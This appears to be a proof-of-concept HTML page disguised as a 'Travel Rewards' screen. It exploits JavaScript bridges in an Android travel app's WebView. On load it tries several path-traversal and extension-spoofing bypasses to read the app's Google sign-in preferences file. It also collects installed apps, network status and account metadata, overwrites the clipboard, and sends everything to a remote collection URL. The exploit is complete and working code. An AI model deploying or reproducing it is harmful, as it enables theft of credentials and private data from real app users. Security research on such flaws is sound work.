<!DOCTYPE html>
<html>
<head>
    <title>Travel Rewards - Processing...</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .log { border: 1px solid #333; padding: 10px; margin-top: 20px; white-space: pre-wrap; font-size: 12px; }
    </style>
</head>
<body>
    <h2>Initializing Secure Session...</h2>
    <div id="status">Scanning Bridge Interfaces...</div>
    <div id="console" class="log"></div>

    <script>
        const C2 = "https://evilios.free.beeceptor.com/exfil";
        const TARGET_PATH = "/data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";

        function logToC2(type, payload) {
            const statusDiv = document.getElementById('console');
            statusDiv.innerText += `[${type}] Sending data...\n`;
            
            fetch(C2, {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify({
                    label: type,
                    data: payload,
                    ts: Date.now()
                })
            });
        }

        async function runExploit() {
            // --- 1. Destination_a: Arbitrary File Read Bypasses ---
            if (window.Destination_a && window.Destination_a.gsImageBase64Str) {
                const bypasses = [
                    { name: "DIRECT", path: TARGET_PATH },
                    { name: "TRAVERSAL", path: "/sdcard/../../" + TARGET_PATH },
                    { name: "EXT_SPOOF_JPG", path: TARGET_PATH + "?.jpg" },
                    { name: "EXT_SPOOF_PNG", path: TARGET_PATH + "#.png" },
                    { name: "NULL_BYTE", path: TARGET_PATH + "\0.jpg" }
                ];

                bypasses.forEach(b => {
                    try {
                        const result = window.Destination_a.gsImageBase64Str(b.path);
                        if (result && result !== "null") {
                            logToC2(`FILE_STEAL_${b.name}`, result);
                        }
                    } catch (e) {
                        logToC2(`ERROR_${b.name}`, e.message);
                    }
                });
            }

            // --- 2. Util_a: Privacy and System Manipulation ---
            if (window.Util_a) {
                // Exfiltrate Installed Apps (Privacy Violation)
                try {
                    const appList = window.Util_a.getInstalledAppList();
                    logToC2("INSTALLED_APPS", appList);
                } catch (e) {}

                // Clipboard Hijack (Impact Demonstration)
                try {
                    window.Util_a.copyToClipboard("pwned_by_dnelsaka_vulnerability_research");
                    logToC2("CLIPBOARD_ACTION", "Clipboard text replaced");
                } catch (e) {}

                // Grab Network Info
                try {
                    const netStatus = window.Util_a.checkNetworkStatus();
                    logToC2("NETWORK_INFO", netStatus);
                } catch (e) {}
            }

            // --- 3. IBUMarket_a: Alliance/Account Metadata ---
            if (window.IBUMarket_a) {
                try {
                    const alliance = window.IBUMarket_a.getAllianceInfo();
                    logToC2("ALLIANCE_METADATA", alliance);
                } catch (e) {}
            }

            document.getElementById('status').innerText = "Session Established. Please wait...";
        }

        // Execute when the WebView is ready
        window.onload = () => {
            setTimeout(runExploit, 1000); 
        };
    </script>
</body>
</html>
